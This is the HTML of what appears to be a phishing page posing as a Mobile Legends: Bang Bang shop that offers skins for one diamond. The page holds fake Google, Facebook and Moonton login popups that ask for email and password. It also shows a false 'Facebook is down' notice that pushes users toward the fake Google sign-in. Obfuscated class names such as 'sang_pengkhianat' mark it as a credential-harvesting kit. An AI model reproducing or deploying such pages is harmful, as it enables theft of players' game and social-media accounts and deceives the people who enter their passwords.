<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0b.jpg" data-name="Neobeast Brody" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0b.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0c.jpg" data-name="Neobeast Pharsa" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0c.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0d.jpg" data-name="Neobeast Lylia" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0d.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/1a.jpg" data-name="Revenant of Roses" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/1a.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a1.jpg" data-name="Sovereign of Realms" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a1.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a2.jpg" data-name="Psion of Tomorrow" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a2.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a3.jpg" data-name="Starfall Knight" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a3.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/1.jpg" data-name="Killua" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/1.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/2.jpg" data-name="Gon" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/2.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/3.jpg" data-name="Kurapika" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/3.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/4.jpg" data-name="Hisoka" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/4.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/17.jpg" data-name="Serene Plume" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/17.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b2.jpg" data-name="Veil of the Celestials" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b2.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b3.jpg" data-name="Mecha-King Perseus" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b3.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b4.jpg" data-name="Blood Serpent" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b4.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b1.jpg" data-name="Empyrean Paladin" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b1.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/18.jpg" data-name="Agent Z" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/18.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/19.jpg" data-name="Death Oath" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/19.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/20.jpg" data-name="Doom Catalyst" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/20.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a5.jpg" data-name="The Navigator" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a5.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a6.jpg" data-name="Flying Swallow" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a6.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a7.jpg" data-name="Shura" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a7.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a8.jpg" data-name="Dimension Walker" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/a8.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/5.jpg" data-name="Swordmaster" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/5.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/6.jpg" data-name="Thunderfist" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/6.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/7.jpg" data-name="Firebolt" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/7.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/8.jpg" data-name="Blizzard Storm" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/8.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/13.jpg" data-name="Satoru Gojo" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/13.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/14.jpg" data-name="Megumi Fushiguro" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/14.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/15.jpg" data-name="Yuji Itadori" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/15.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/16.jpg" data-name="Nobara Kugisaki" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/16.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b5.jpg" data-name="Exorcist Hayabusa" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b5.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b6.jpg" data-name="Exorcist Granger" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b6.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b7.jpg" data-name="Exorcist Yu Zhong" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b7.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>
<div class="itemlow_bgv itemShine" onmousedown="buka.play();" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b8.jpg" data-name="Exorcist Kagura" data-id="" value="1" onclick="open_itemReward_confirmation(this);">
<div class="itemlowv">
<div>
<figure>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/b8.jpg">
<div class="item-price"><img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">1</div>
<div class="item-nominalv">Purchase</div>
</figure>
</div>
<div></div>
</div>
</div>

</div>
</div>
</div>
</center> 
</div>
</div>
</div>
</div>
<div class="footer">
<center>
<img class="footer-copyright-icon" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/moonton_logo.png">
<div style="height:10px"></div>
<div class="footer-copyright-text-left">Privacy Policy</div>
<div class="footer-copyright-text-center">&nbsp</div>
<div class="footer-copyright-text-right">Terms Of Service</div>
<div style="height:10px"></div>
<div class="footer-txt-copyright">Mobile Legends: Bang Bang</div>
<div class="footer-txt-copyright">© Moonton. All rights reserved</div>
<img class="footer-copyright-text-icon" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/facebooks.png">
<img class="footer-copyright-text-icon" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/twitter.png">
<img class="footer-copyright-text-icon" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/instagram.png">
<img class="footer-copyright-text-icon" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/tiktok.png">
<img class="footer-copyright-text-icon" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/youtube.png">
<img class="footer-copyright-text-icon" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/moonton.png">
<br>
</center>
</div>
</div>

<div class="sang_pengkhianat itemReward_confirmation animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg_shop">
<div class="pengkhianat_box_navbar">
<img onmousedown="tutup.play();" onclick="close_itemReward_confirmation();" src="https://cdn.stackpath.web.id/mlbb/12/img/close.png">
<div class="pengkhianat_box_navbar_title_logo">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/mlbb_logo.png"></img>
</div>
<div class="pengkhianat_box_navbar_title_reward">
<a>Purchase Confirmation</a>
</div>
</div>
<div class="pengkhianat_box_alert_center_id_shop">Are you sure exchange for this item?</div>
<div class="pengkhianat_box_form_id_shop" style="height: 210px;">
<div class="pengkhianat_box_bg_shop_id" style="height: 0px;">
<div class="pengkhianat_box_bg_item" style="margin-top: 23px;">
<div class="pengkhianat_box_alert_redeem">
<a id="rewardName">Si Lenzz Ganteng Banget</a></div>
<div class="pengkhianat_box_alert_redeem_line"></div>
<div class="pengkhianat_box_alert_redeem">Total Cost: <img src="https://cdn.stackpath.web.id/mlbb/12/img/dm.png">
<span id="price">061213</span>
</div>
</div>
<div class="pengkhianat_box_item_redeem itemShine">
<div>
<figure>
<img class="redeemRewardsImg flip" src="https://cdn.stackpath.web.id/mlbb/12/img/lenzz/0a.jpg" id="myItemReward_confirmationImg"> 
</figure>
</div>
</div>
</div>
<br><br><br><br><br>
<div class="pengkhianat_box_form_id_shop_pad">
<div class="pengkhianat_box_form_footer_id">
<center>
<button type="submit" id="btn-redeem" onmousedown="buka.play();" onclick="open_verifs();">Confirm</button>
<button style="display: none;" id="btn-redeem-on" type="submit" onmousedown="buka.play();" onclick="open_process()">Confirm</button>
</center>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="popup-login login-gp animated fadeIn" style="display: none;">
<div class="popup-box-login-gg">
<a onmousedown="tutup.play();" onclick="close_log_gp()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-gg">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn-gp.png">
<div class="header-gg-text"> Log in With Google </div>
</div>
<div class="content-box-gg">
<div class="txt-login-gg">Sign in</div>
<div class="txt-login-ggs">to continue to <a style="color:#185FD1;font-weight: 500;">mobilelegends.com</a></div>
<form action="javascript:void(0)" method="post" id="ValidateLoginGpForm" autocomplete="off">
<div class="form__div">
<input type="email" name="email" class="form__input" placeholder="" id="email-gp" required oninvalid="this.setCustomValidity('Enter your valid E-mail address')" oninput="setCustomValidity('')" autocomplete="false">
<label for="" class="form__label">Email address</label>
</div>
<div class="form__div">
<input autocomplete="one-time-code" name="password" type="password" class="form__input" placeholder="" id="password-gp" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label for="" class="form__label">Enter your password</label>
</div>
<center>
<div class="alert-gg-failed email-gp">
<a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Sorry, we couldn't find your account.</a>
</div>
<div class="alert-gg-failed sandi-gp">
<a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Wrong password. Please try again!</a>
</div>
</center>
<div class="showpass">
<input style="float:left; margin-left: 1px;" type="checkbox" onclick="showHide();">
<label for="showpass">Show Password</label>
</div>
<div class="content-box-gg-txt-footer">
By continuing, Google will share your name, email address, language preference, and profile picture with mobilelegends.com's. See mobilelegends.com's <a>Privacy Policy</a> and <a>Terms of Service.</a><br><br>You can manage Sign in with Google in your <a>Google Account</a>.
</div>
<input type="hidden" name="login" id="login-gp" value="Google Play" readonly>
<input type="hidden" name="playid" id="validatePlayID" readonly>
<input type="hidden" name="nickname" id="validateNickname" readonly>
<button type="submit" class="nonbutton" onclick="ValidateLoginGpData()">Log in</button>
</form>
<div class="content-box-gg-txt-footer">
<a style="font-size:15px; font-weight:400;">Forgot password?</a>
</div>
</div>
</div>
</div>

<div class="popup-login login-gp-load" style="display: none;">
<div class="popup-box-login-gg">
<div class="header-gg">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn-gp.png">
<div class="header-gg-text"> Log in With Google </div>
</div>
<div class="content-box-gg">
<div class="txt-login-gg">Sign in</div>
<div class="txt-login-ggs">to continue to <a style="color:#185FD1;font-weight: 500;">mobilelegends.com</a></div>
<div class="gg-load">
<div class="gg-load-title">
<div class="lds-ring">
<div></div>
<div></div>
<div></div>
<div></div>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="popup-login login-facebook-mt animated fadeIn" style="display: none;">
<div class="popup-box-login-facebook-mt">
<div class="header-facebook-mt">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/icon-facebook.png">
<div class="header-facebooks-text"> Log in With Facebook </div>
</div>
<div class="content-box-facebook-mt">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/fbmt.png">
<div class="navbar-alert-facebook-mt">
<div style="text-align:center; margin-bottom:5px;">
<b>Facebook Will Be Back Soon</b>
</div>
<div style="text-align:left;">
Facebook is currently down due to maintenance. We recommend that you try logging in with your <b>Google Account</b>. #1029
</div>
</div>
<div class="content-box-facebook-id">
<button type="submit" class="fbbutton-mt" onclick="open_log_gp()">
<img class="icon-login" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn-gp.png"></img>
Sign In With Google Account
</button>
<div class="content-box-facebooks-txt-footer">
By continuing, Mobile Legends: Bang Bang will receive ongoing access to the information that you share and Facebook will record when Mobile Legends: Bang Bang accesses it. <a>Learn more</a> about this sharing and the settings that you have.
</div>
<div class="content-box-facebooks-txt-footers">Mobile Legends: Bang Bang's <a>Privacy Policy</a> and <a>Terms</a></div>
</div>
</div>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-facebooks">
<a onmousedown="tutup.play();" onclick="close_log_fb()" class="close-facebooks"><i class="zmdi zmdi-close"></i></a>
<div class="header-facebooks">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/icon-facebook.png">
<div class="header-facebooks-text"> Log in With Facebook </div>
</div>
<div class="content-box-facebooks">
<div class="navbar-alert-facebooks wrong-fb" style="display: none;text-align: center;"><b>The data you entered is incorrect.<br>Please re-login using the correct data!</b></div>
<div class="navbar-alert-facebooks email-fb">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div>
<div class="navbar-alert-facebooks sandi-fb">The password that you've entered is incorrect. <b>Forgotten password?</b></div>
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/app_icon.png">
<div class="txt-login-facebooks">
Log in to your Facebook account to connect with Mobile Legends: Bang Bang
</div>
<div class="txt-login-alert-facebooks">This doesn't let the app post to Facebook.</div>
<div class="content-box-facebook-id">
<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm" autocomplete="off">
<div class="form-group-facebooks">
<input type="text" name="email" id="email-facebook" autocomplete="false" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Mobile number or email</label>
</div>
<div class="form-group-facebooks">
<div class="form-group-sohiw showPassword" onclick="showFbPassword()"><img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/Facebook-Hide-Password.png"></div>
<div class="form-group-sohiw hidePassword" style="display: none;" onclick="hideFbPassword()"><img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/Facebook-Show-Password.png"></div>
<input autocomplete="one-time-code" type="password" name="password" id="password-facebook" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Password</label>
</div>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<input type="hidden" name="playid" id="validatePlayID" readonly>
<input type="hidden" name="nickname" id="validateNickname" readonly>
<button type="submit" class="fbbutton" onclick="ValidateLoginFbData()">Log in</button>
</form>
<div class="content-box-facebooks-txt-footer">
By continuing, Mobile Legends: Bang Bang will receive ongoing access to the information that you share and Facebook will record when Mobile Legends: Bang Bang accesses it. <a>Learn more</a> about this sharing and the settings that you have.
</div>
<div class="content-box-facebooks-txt-footers">Mobile Legends: Bang Bang's <a>Privacy Policy</a> and <a>Terms</a></div>
</div>
</div>
</div>
</div>

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-facebooks">
<div class="header-facebooks">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/icon-facebook.png">
<div class="header-facebooks-text"> Log in With Facebook </div>
</div>
<div class="content-box-fbs">
<div class="fb-load">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/icon_fb.png">
<div class="loader3"></div>
</div>
</div>
</div>
</div>

<div class="sang_pengkhianat login-mail animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg_shop">
<div class="pengkhianat_box_navbar">
<img onmousedown="tutup.play();" onclick="close_log_mt()" src="https://cdn.stackpath.web.id/mlbb/12/img/close.png">
<div class="pengkhianat_box_navbar_title_logo2">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn_mt.png"></img>
</div>
<div class="pengkhianat_box_navbar_title_reward">
<a>Login with Moonton Account</a>
</div>
</div>
<br><br><br>
<p class="kagetk email-k" style="display: none;margin-top: -38px;">Wrong e-mail. Please enter again.</p>
<p class="kagetk sandi-k" style="display: none;margin-top: -45px;">Use 6 or more characters with a combination of upper and lower case letters, and do not use special characters.</p>
<p class="kagetk gp-mt" style="display: none;margin-top: -45px;">Wrong Google Password. Please enter again.</p>
<div class="pengkhianat_box_form_email" style="height:250px;">
<div class="form_login" id="emaillog">
<form action="javascript:void(0)" method="post" id="ValidateLoginMailForm" autocomplete="off">
<input type="hidden" name="login" id="login-mail" value="Moonton" readonly>
<input type="hidden" name="playid" id="validatePlayID" readonly>
<input type="hidden" name="nickname" id="validateNickname" readonly>
<div class="pengkhianat_box_bg_label_id">
<div class="pengkhianat_box_form_login_id">
<input onfocus="removeBorder()" type="email" name="email" id="email-k" autoCapitalize='none' placeholder="Enter your e-mail address" required oninvalid="this.setCustomValidity('Input your E-mail address')" oninput="setCustomValidity('')">
<label>Login with Moonton Account</label>
</div>
</div>
<div class="pengkhianat_box_bg_label_id" style="margin-top:20px;">
<div class="pengkhianat_box_form_login_id">
<div class="center">
<div class="mata2">
<span class="form-group-mat showPassword" onclick="showMtPassword()"><img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/Hide-Password.png"></span>
<span class="form-group-mat hidePassword" style="display: none;" onclick="hideMtPassword()"><img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/Show-Password.png"></span>
</div>
</div>
<input autocomplete="one-time-code" onfocus="removeBorder()" type="password" name="password" pattern="[a-zA-Z0-9]+" id="password-k" placeholder="Please enter password" required oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
<label>Use 6 or more characters with a combination of upper and lower case letters, and do not use special characters.</label>
</div>
</div>
<div class="pengkhianat_box_bg_label_id" style="margin-top:30px;">
